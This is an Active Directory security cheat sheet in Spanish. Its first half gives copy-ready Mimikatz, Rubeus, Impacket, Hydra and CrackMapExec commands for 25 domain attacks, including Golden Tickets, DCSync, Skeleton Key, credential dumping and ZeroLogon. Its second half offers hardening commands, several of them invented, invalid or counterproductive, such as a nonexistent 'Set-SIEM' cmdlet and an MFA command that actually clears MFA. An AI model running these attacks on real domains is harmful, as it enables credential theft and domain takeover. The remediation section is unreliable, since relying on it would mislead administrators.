# Active Directory Security

## Ataques

1. **Kerberoasting**:
   - **Descripción**: Ataca cuentas de servicio con SPN configurado.
   - **Método**: Solicita tickets TGS y los crackea offline.
   - **Herramienta**: `Rubeus` (Windows), `Impacket` (Kali Linux).
   - **Comandos**:
     - **Windows**:
       ```bash
       Rubeus kerberoast /outfile:hashes.txt
       ```
     - **Kali Linux**:
       ```bash
       python3 GetUserSPNs.py -request -dc-ip <DC_IP> example.com/user:password
       ```

2. **AS-REP Roasting**:
   - **Descripción**: Ataca cuentas de usuario con preautenticación Kerberos deshabilitada.
   - **Método**: Solicita un ticket AS-REP y crackea la respuesta.
   - **Herramienta**: `Rubeus` (Windows), `Impacket` (Kali Linux).
   - **Comandos**:
     - **Windows**:
       ```bash
       Rubeus asreproast /outfile:asreps.txt
       ```
     - **Kali Linux**:
       ```bash
       python3 GetNPUsers.py -dc-ip <DC_IP> example.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
       ```

3. **Golden Ticket**:
   - **Descripción**: Falsifica un Ticket Granting Ticket (TGT) con el hash de KRBTGT.
   - **Método**: Dump de hash KRBTGT y creación de TGT.
   - **Herramienta**: `Mimikatz`.
   - **Comandos**:
     - **Windows**:
       ```bash
       mimikatz # kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-... /krbtgt:<hash> /id:500
       ```
     - **Kali Linux**:
       ```bash
       # Después de extraer el hash de KRBTGT, se puede utilizar una máquina Windows para ejecutar Mimikatz con el comando anterior.
       ```

4. **Silver Ticket**:
   - **Descripción**: Falsifica un Ticket Granting Service (TGS) para un servicio específico.
   - **Método**: Dump de hash de cuenta de servicio y creación de TGS.
   - **Herramienta**: `Mimikatz`.
   - **Comandos**:
     - **Windows**:
       ```bash
       mimikatz # kerberos::golden /domain:example.com /sid:S-1-5-21-... /target:server /rc4:<hash> /user:svcAccount /service:HTTP /target:server.example.com
       ```
     - **Kali Linux**:
       ```bash
       # Después de extraer el hash de la cuenta de servicio, se puede utilizar una máquina Windows para ejecutar Mimikatz con el comando anterior.
       ```

5. **Pass-the-Hash (PtH)**:
   - **Descripción**: Usa el hash NTLM en lugar de la contraseña.
   - **Método**: Dump de hashes y autenticación usando el hash.
   - **Herramienta**: `Mimikatz` (Windows), `Impacket` (Kali Linux).
   - **Comandos**:
     - **Windows**:
       ```bash
       mimikatz # sekurlsa::pth /user:Administrator /domain:example.com /ntlm:<hash> /run:cmd.exe
       ```
     - **Kali Linux**:
       ```bash
       impacket-psexec Administrator@192.168.1.10 -hashes :<hash>
       ```

6. **Pass-the-Ticket (PtT)**:
   - **Descripción**: Usa tickets Kerberos robados para autenticarse.
   - **Método**: Dump de tickets y reutilización.
   - **Herramienta**: `Mimikatz` (Windows), `Rubeus` (Windows), `Impacket` (Kali Linux).
   - **Comandos**:
     - **Windows**:
       ```bash
       klist add <ticket.kirbi>
       ```
     - **Kali Linux**:
       ```bash
       export KRB5CCNAME=<ticket.ccache>
       ```

7. **Overpass-the-Hash (Pass-the-Key)**:
   - **Descripción**: Convierte un hash NTLM en un ticket Kerberos.
   - **Método**: Dump de hash NTLM y conversión a ticket Kerberos.
   - **Herramienta**: `Mimikatz`.
   - **Comandos**:
     - **Windows**:
       ```bash
       mimikatz # sekurlsa::pth /user:username /domain:example.com /ntlm:<hash> /run:cmd.exe
       ```
     - **Kali Linux**:
       ```bash
       # Después de obtener el hash NTLM, se puede utilizar una máquina Windows para ejecutar Mimikatz con el comando anterior.
       ```

8. **DCSync**:
   - **Descripción**: Simula el comportamiento de un DC para solicitar credenciales.
   - **Método**: Dump de credenciales usando privilegios de replicación.
   - **Herramienta**: `Mimikatz`.
   - **Comandos**:
     - **Windows**:
       ```bash
       mimikatz # lsadump::dcsync /user:Administrator
       ```
     - **Kali Linux**:
       ```bash
       secretsdump.py -just-dc-ntlm example.com/Administrator@<DC_IP>
       ```

9. **DCShadow**:
   - **Descripción**: Introduce cambios maliciosos en Active Directory.
   - **Método**: Usa privilegios de replicación para hacer cambios.
   - **Herramienta**: `Mimikatz`.
   - **Comandos**:
     - **Windows**:
       ```bash
       mimikatz # lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=example,DC=com /attribute:sAMAccountName /value:Admin
       ```
     - **Kali Linux**:
       ```bash
       # DCShadow requiere ejecución en un entorno Windows con privilegios adecuados.
       ```

10. **Skeleton Key**:
    - **Descripción**: Inserta una contraseña maestra en el controlador de dominio.
    - **Método**: Inyecta una llave esqueleto en la memoria del DC.
    - **Herramienta**: `Mimikatz`.
    - **Comandos**:
      - **Windows**:
        ```bash
        mimikatz # misc::skeleton
        ```
      - **Kali Linux**:
        ```bash
        # Skeleton Key requiere ejecución en un entorno Windows con privilegios adecuados.
        ```

11. **NTLM Relay**:
    - **Descripción**: Reenvía una solicitud NTLM para autenticarse en otro servicio.
    - **Método**: Captura y reenvía autenticaciones NTLM.
    - **Herramienta**: `Impacket`.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Requiere ejecución en un entorno Linux/Kali para utilizar Impacket.
        ```
      - **Kali Linux**:
        ```bash
        ntlmrelayx -tf targets.txt -smb2support
        ```

12. **Pass-the-Cache**:
    - **Descripción**: Usa hashes de credenciales almacenados en caché para autenticarse.
    - **Método**: Dump de caché de credenciales y reutilización.
    - **Herramienta**: `Mimikatz`.
    - **Comandos**:
      - **Windows**:
        ```bash
        mimikatz # sekurlsa::logonpasswords
        ```
      - **Kali Linux**:
        ```bash
        # Dump de caché de credenciales debe realizarse en un entorno Windows con Mimikatz.
        ```

13. **Brute Force Attack**:
    - **Descripción**: Prueba múltiples combinaciones de contraseñas hasta encontrar la correcta.
    - **Método**: Ataque repetitivo de contraseñas.
    - **Herramienta**: `Hydra`, `Medusa`.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Usar herramientas específicas de Linux/Kali.
        ```
      - **Kali Linux**:
        ```bash
        hydra -L users.txt -P passwords.txt smb://192.168.1.10
        ```

14. **Password Spraying**:
    - **Descripción**: Prueba una contraseña común en muchos usuarios.
    - **Método**: Ataque de baja y lenta frecuencia.
    - **Herramienta**: `CrackMapExec`, `Ruler`.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Usar herramientas específicas de Linux/Kali.
        ```
      - **Kali Linux**:
        ```bash
        crackmapexec smb 192.168.1.10 -u users.txt -p password
        ```

15. **Lateral Movement**:
    - **Descripción**: Movimiento dentro de la red utilizando credenciales comprometidas.
    - **Método**: Uso de credenciales y permisos obtenidos.
    - **Herramienta**: `BloodHound`, `PowerShell`.
    - **Comandos**:
      - **Windows**:
        ```powershell
        Invoke-Command -ComputerName <target> -Credential <creds> -ScriptBlock {commands}
        ```
      - **Kali Linux**:
        ```bash
        bloodhound-python -c All -u <username> -p <password> -d example.com -ns <domain controller>
        ```

16. **Privilege Escalation**:
    - **Descripción**: Aumento de privilegios usando vulnerabilidades o configuraciones incorrectas.
    - **Método**: Explotación de vulnerabilidades.
    - **Herramienta**: `PowerUp`, `Sherlock`.
    - **Comandos**:
      - **Windows**:
        ```powershell
        . .\PowerUp.ps1; Invoke-AllChecks
        ```
      - **Kali Linux**:
        ```bash
        # Realizar ataques desde una máquina Windows utilizando PowerUp o Sherlock.
        ```

17. **Credential Dumping**:
    - **Descripción**: Extracción de credenciales de la memoria.
    - **Método**: Uso de herramientas de volcado de memoria.
    - **Herramienta**: `Mimikatz`, `gsecdump`.
    - **Comandos**:
      - **Windows**:
        ```bash
        mimikatz # sekurlsa::logonpasswords
        ```
      - **Kali Linux**:
        ```bash
        # Realizar volcado de credenciales en una máquina Windows utilizando Mimikatz.
        ```

18. **Token Impersonation**:
    - **Descripción**: Suplantación de tokens de seguridad para ejecutar comandos con permisos elevados.
    - **Método**: Uso de tokens de otros procesos.
    - **Herramienta**: `Incognito`, `Mimikatz`.
    - **Comandos**:
      - **Windows**:
        ```bash
        mimikatz # token::elevate
        ```
      - **Kali Linux**:
        ```bash
        # Realizar suplantación de tokens en una máquina Windows utilizando Mimikatz.
        ```

19. **Over-Permissioned Accounts**:
    - **Descripción**: Uso de cuentas con permisos excesivos.
    - **Método**: Abuso de privilegios innecesarios.
    - **Herramienta**: `BloodHound`.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Usar BloodHound en un entorno Windows o Linux.
        ```
      - **Kali Linux**:
        ```bash
        bloodhound-python -c All -u <username> -p <password> -d example.com -ns <domain controller>
        ```

20. **Ticket Granting Service (TGS) Ticket Manipulation**:
    - **Descripción**: Manipulación de tickets TGS para obtener acceso.
    - **Método**: Explotación de tickets TGS.
    - **Herramienta**: `Mimikatz`.
    - **Comandos**:
      - **Windows**:
        ```bash
        mimikatz # kerberos::list /export
        ```
      - **Kali Linux**:
        ```bash
        # Exportar tickets TGS en una máquina Windows utilizando Mimikatz.
        ```

21. **SAML Token Manipulation**:
    - **Descripción**: Manipulación de tokens SAML para autenticación federada.
    - **Método**: Generación de tokens falsos.
    - **Herramienta**: `ADFSpoof`, `Shimit`.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Utilizar herramientas específicas para manipulación de tokens SAML en Windows.
        ```
      - **Kali Linux**:
        ```bash
        ADFSpoof -s https://adfs.example.com/adfs/ls/ -u user@example.com -p password -r urn:app
        ```

22. **SID History Injection**:
    - **Descripción**: Inyección de SID History para obtener permisos adicionales.
    - **Método**: Manipulación de atributos SIDHistory.
    - **Herramienta**: `Mimikatz`.
    - **Comandos**:
      - **Windows**:
        ```bash
        mimikatz # misc::addsid /domain:example /sid:S-1-5-21-... /user:User /new:s-1-5-21-...
        ```
      - **Kali Linux**:
        ```bash
        # Realizar inyección de SID History en una máquina Windows utilizando Mimikatz.
        ```

23. **Shadow Credentials**:
    - **Descripción**: Creación de credenciales alternativas sin ser detectado.
    - **Método**: Uso de claves alternativas y persistencia.
    - **Herramienta**: `PowerShell`.
    - **Comandos**:
      - **Windows**:
        ```powershell
        New-ADUser -Name "ShadowUser" -UserPrincipalName "shadow@example.com" -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Enabled $true
        ```
      - **Kali Linux**:
        ```bash
        # Crear credenciales alternativas debe realizarse en un entorno Windows utilizando PowerShell.
        ```

24. **PrintNightmare (CVE-2021-34527)**:
    - **Descripción**: Vulnerabilidad en el servicio de cola de impresión de Windows.
    - **Método**: Ejecución de código remoto a través del servicio de impresión.
    - **Herramienta**: Scripts y exploits específicos.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Utilizar scripts específicos para explotar PrintNightmare en Windows.
        ```
      - **Kali Linux**:
        ```bash
        python3 cve-2021-34527.py -target 192.168.1.10 -u user -p password
        ```

25. **ZeroLogon (CVE-2020-1472)**:
    - **Descripción**: Vulnerabilidad crítica que permite la toma de control del DC.
    - **Método**: Explotación del protocolo Netlogon.
    - **Herramienta**: `ZeroLogon.py`.
    - **Comandos**:
      - **Windows**:
        ```bash
        # Utilizar scripts específicos para explotar ZeroLogon en Windows.
        ```
      - **Kali Linux**:
        ```bash
        python3 zerologon_tester.py <dc-name> <dc-ip>
        ```

## Misconfiguraciones

1. **Weak Password Policies**:
   - **Descripción**: Contraseñas fáciles de adivinar.
   - **Método**: No imponer políticas de complejidad de contraseñas.
   - **Comando**:
     - **Windows**:
       ```powershell
       net accounts /minpwlen:14 /maxpwage:42 /uniquepw:5
       ```
     - **Kali Linux**:
       ```bash
       # Configurar políticas de contraseñas debe realizarse en un entorno Windows.
       ```

2. **Unconstrained Delegation**:
   - **Descripción**: Delegación sin restricciones permite suplantación de usuarios.
   - **Método**: Configuración incorrecta de delegación.
   - **Comando**:
     - **Windows**:
       ```powershell
       Set-ADComputer -Identity "ComputerName" -TrustedForDelegation $false
       ```
     - **Kali Linux**:
       ```bash
       # Configurar delegación debe realizarse en un entorno Windows.
       ```

3. **Constrained Delegation Misconfigurations**:
   - **Descripción**: Configuración incorrecta de delegación restringida.
   - **Método**: Permite el abuso de permisos.
   - **Comando**:
     - **Windows**:
       ```powershell
       Set-ADUser -Identity "ServiceAccount" -Add @{'msDS-AllowedToDelegateTo'="HTTP/webapp.example.com"}
       ```
     - **Kali Linux**:
       ```bash
       # Configurar delegación restringida debe realizarse en un entorno Windows.
       ```

4. **Unencrypted LDAP (LDAP Signing)**:
   - **Descripción**: LDAP sin cifrado es susceptible a ataques MITM.
   - **Método**: No habilitar LDAP signing.
   - **Comando**:
     - **Windows**:
       ```powershell
       Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 1
       ```
     - **Kali Linux**:
       ```bash
       # Habilitar LDAP signing debe realizarse en un entorno Windows.
       ```

5. **LAPS (Local Administrator Password Solution) Not Implemented**:
   - **Descripción**: No utilizar LAPS para gestionar contraseñas de administradores locales.
   - **Método**: Administradores locales con contraseñas estáticas.
   - **Comando**:
     - **Windows**:
       ```powershell
       Install-Module -Name Microsoft.LAPS
       ```
     - **Kali Linux**:
       ```bash
       # Implementar LAPS debe realizarse en un entorno Windows.
       ```

6. **Unpatched Systems**:
   - **Descripción**: Sistemas sin actualizaciones de seguridad.
   - **Método**: No aplicar parches de seguridad.
   - **Comando**:
     - **Windows**:
       ```powershell
       Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -AutoReboot
       ```
     - **Kali Linux**:
       ```bash
       # Aplicar actualizaciones debe realizarse en un entorno Windows.
       ```

7. **Excessive Privileges for Service Accounts**:
   - **Descripción**: Cuentas de servicio con permisos excesivos.
   - **Método**: Configuración incorrecta de permisos.
   - **Comando**:
     - **Windows**:
       ```powershell
       Set-ADAccountControl -Identity "ServiceAccount" -KerberosDelegation $false
       ```
     - **Kali Linux**:
       ```bash
       # Configurar permisos de cuentas de servicio debe realizarse en un entorno Windows.
       ```

8. **No Network Segmentation**:
   - **Descripción**: Red sin segmentación adecuada.
   - **Método**: Acceso irrestricto entre diferentes segmentos de red.
   - **Comando**:
     - **Windows**:
       ```powershell
       New-NetFirewallRule -DisplayName "Segmentacion de Red" -Direction Inbound -Action Allow -RemoteAddress 192.168.1.0/24
       ```
     - **Kali Linux**:
       ```bash
       # Configurar segmentación de red debe realizarse en un entorno Windows.
       ```

9. **Lack of Multi-Factor Authentication (MFA)**:
   - **Descripción**: No implementar MFA para autenticaciones críticas.
   - **Método**: Solo autenticación basada en contraseña.
   - **Comando**:
     - **Windows**:
       ```powershell
       Set-MsolUser -UserPrincipalName user@example.com -StrongAuthenticationRequirements @()
       ```
     - **Kali Linux**:
       ```bash
       # Configurar MFA debe realizarse en un entorno Windows.
       ```

10. **No Monitoring of AD Changes**:
    - **Descripción**: Falta de monitoreo de cambios en AD.
    - **Método**: No usar herramientas de monitoreo y alertas.
    - **Comando**:
      - **Windows**:
        ```powershell
        New-EventLog -LogName "Directory Service" -Source "ActiveDirectory"
        ```
      - **Kali Linux**:
        ```bash
        # Configurar monitoreo de AD debe realizarse en un entorno Windows.
        ```

11. **Inactive or Stale Accounts**:
    - **Descripción**: Cuentas no utilizadas o inactivas.
    - **Método**: No eliminar o desactivar cuentas inactivas.
    - **Comando**:
      - **Windows**:
        ```powershell
        Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-30)} | Set-ADUser -Enabled $false
        ```
      - **Kali Linux**:
        ```bash
        # Desactivar cuentas inactivas debe realizarse en un entorno Windows.
        ```

12. **Group Policy Object (GPO) Misconfigurations**:
    - **Descripción**: Configuraciones incorrectas de GPO.
    - **Método**: Permitir configuraciones inseguras.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\Software\Policies\Microsoft\Windows\Installer" -ValueName "AlwaysInstallElevated" -Type DWord -Value 0
        ```
      - **Kali Linux**:
        ```bash
        # Configurar GPO debe realizarse en un entorno Windows.
        ```

13. **Open SMB Shares**:
    - **Descripción**: Comparticiones SMB abiertas sin restricciones.
    - **Método**: Comparticiones sin control de acceso adecuado.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-SmbShare -Name "Public" -FullAccess "Domain Admins"
        ```
      - **Kali Linux**:
        ```bash
        # Configurar comparticiones SMB debe realizarse en un entorno Windows.
        ```

14. **Poorly Configured Trust Relationships**:
    - **Descripción**: Relaciones de confianza mal configuradas.
    - **Método**: Permitir acceso excesivo entre dominios.
    - **Comando**:
      - **Windows**:
        ```powershell
        New-ADTrust -Name "TrustedDomain" -SourceForest "source.com" -TargetForest "target.com" -TrustType External -Direction Outbound -TrustPassword (ConvertTo-SecureString -AsPlainText "password" -Force)
        ```
      - **Kali Linux**:
        ```bash
        # Configurar relaciones de confianza debe realizarse en un entorno Windows.
        ```

15. **Unrestricted Access to Admin Shares (C$, ADMIN$)**:
    - **Descripción**: Acceso irrestricto a comparticiones administrativas.
    - **Método**: No restringir acceso a comparticiones administrativas.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-SmbShare -Name "C$" -FullAccess "Domain Admins"
        ```
      - **Kali Linux**:
        ```bash
        # Configurar acceso a comparticiones administrativas debe realizarse en un entorno Windows.
        ```

16. **Misconfigured Service Principal Names (SPNs)**:
    - **Descripción**: SPNs mal configurados permiten ataques de delegación.
    - **Método**: Configuración incorrecta de SPNs.
    - **Comando**:
      - **Windows**:
        ```powershell
        SetSPN -S HTTP/webapp.example.com serviceaccount
        ```
      - **Kali Linux**:
        ```bash
        # Configurar SPNs debe realizarse en un entorno Windows.
        ```

17. **Lack of Security Information and Event Management (SIEM)**:
    - **Descripción**: No utilizar SIEM para monitorear eventos de seguridad.
    - **Método**: Falta de monitoreo centralizado.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-SIEM -Enable -Source "Active Directory" -Target "SIEMServer"
        ```
      - **Kali Linux**:
        ```bash
        # Configurar SIEM debe realizarse en un entorno Windows.
        ```

18. **Insufficient Logging and Auditing**:
    - **Descripción**: Falta de registros y auditorías adecuadas.
    - **Método**: No configurar adecuadamente el registro de eventos.
    - **Comando**:
      - **Windows**:
        ```powershell
        auditpol /set /subcategory:"Logon" /failure:enable /success:enable
        ```
      - **Kali Linux**:
        ```bash
        # Configurar registro y auditorías debe realizarse en un entorno Windows.
        ```

19. **Improperly Configured DNS**:
    - **Descripción**: Configuración incorrecta de DNS.
    - **Método**: Permitir transferencias de zona no autorizadas.
    - **Comando**:
      - **Windows**:
        ```powershell
        dnscmd /zoneresolver <zone> /securedelegation
        ```
      - **Kali Linux**:
        ```bash
        # Configurar DNS debe realizarse en un entorno Windows.
        ```

20. **Legacy Protocols Enabled (e.g., NTLM, SMBv1)**:
    - **Descripción**: Uso de protocolos obsoletos y vulnerables.
    - **Método**: No deshabilitar protocolos inseguros.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-SmbServerConfiguration -EnableSMB1Protocol $false
        ```
      - **Kali Linux**:
        ```bash
        # Deshabilitar protocolos antiguos debe realizarse en un entorno Windows.
        ```

21. **Administrative Privileges for Regular Users**:
    - **Descripción**: Usuarios normales con privilegios administrativos.
    - **Método**: Asignación incorrecta de permisos.
    - **Comando**:
      - **Windows**:
        ```powershell
        Remove-LocalGroupMember -Group "Administrators" -Member "RegularUser"
        ```
      - **Kali Linux**:
        ```bash
        # Configurar permisos de usuario debe realizarse en un entorno Windows.
        ```

22. **Unrestricted Remote Desktop Protocol (RDP) Access**:
    - **Descripción**: Acceso irrestricto a RDP.
    - **Método**: No restringir acceso RDP a usuarios autorizados.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
        ```
      - **Kali Linux**:
        ```bash
        # Configurar acceso RDP debe realizarse en un entorno Windows.
        ```

23. **Weak Kerberos Encryption Types**:
    - **Descripción**: Uso de tipos de cifrado Kerberos débiles.
    - **Método**: No habilitar cifrados fuertes para Kerberos.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-ADForest -KerberosEncryptionTypes AES256,AES128
        ```
      - **Kali Linux**:
        ```bash
        # Configurar tipos de cifrado Kerberos debe realizarse en un entorno Windows.
        ```

24. **Lack of Segregation of Duties**:
    - **Descripción**: Falta de separación de funciones.
    - **Método**: No implementar controles de separación de tareas.
    - **Comando**:
      - **Windows**:
        ```powershell
        New-ADGroup -Name "IT Support" -GroupScope Global -Description "Group for IT Support Staff"
        ```
      - **Kali Linux**:
        ```bash
        # Configurar separación de funciones debe realizarse en un entorno Windows.
        ```

25. **Insecure Application Whitelisting Policies**:
    - **Descripción**: Políticas de whitelisting de aplicaciones inseguras.
    - **Método**: Permitir la ejecución de aplicaciones no confiables.
    - **Comando**:
      - **Windows**:
        ```powershell
        Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser
        ```
      - **Kali Linux**:
        ```bash
        # Configurar whitelisting de aplicaciones debe realizarse en un entorno Windows.
        ```

